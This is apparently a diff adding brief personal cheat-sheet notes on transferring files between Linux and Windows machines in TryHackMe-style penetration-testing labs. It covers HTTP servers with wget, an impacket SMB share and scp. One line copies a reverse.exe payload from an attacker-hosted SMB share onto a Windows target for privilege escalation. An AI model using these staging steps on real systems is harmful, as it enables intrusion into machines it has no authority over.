@@ -1,0 +1,27 @@
+#############################LINUX TO LINUX########################################################
+
+1. python3 -m http.server(in our pc)                           wget http://<localhst>:8000/<file name>(in target machine)
+2. mv <file name> /var/www/html
+   systemctl start apache2
+   then download through wget
+
+3. Python3 SimpleHTTPServer
+
+##############################LINUX TO WINDOWS#######################################################
+
+1. sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . 
+
+  copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe (FOR DOWNLOAD FILE)
+
+
+###################################windows to linux####################################################
+
+1. scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<file name> .
+
+
+
+  
+
+
+
+
